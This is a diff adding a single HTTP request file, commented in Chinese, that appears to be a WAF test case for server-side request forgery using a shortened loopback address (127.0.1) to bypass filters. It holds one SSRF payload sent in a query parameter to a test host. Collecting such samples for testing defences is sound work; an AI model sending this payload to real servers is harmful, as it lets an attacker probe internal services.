@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_信息探测(短IP绕过)
+# 在请求127.0.1地址时，会自动解析为127.0.0.1的本地地址
+GET /?id=http:%2F%2F127.0.1&bid=hd_tag_m8mv25iu HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25iu
+RM-PRO-Token: 3eef5a0f06a035362a480e0d1dd24230
+RM-PRO-Time: 1742808471499
+User-Agent: curl/7.83.1
+
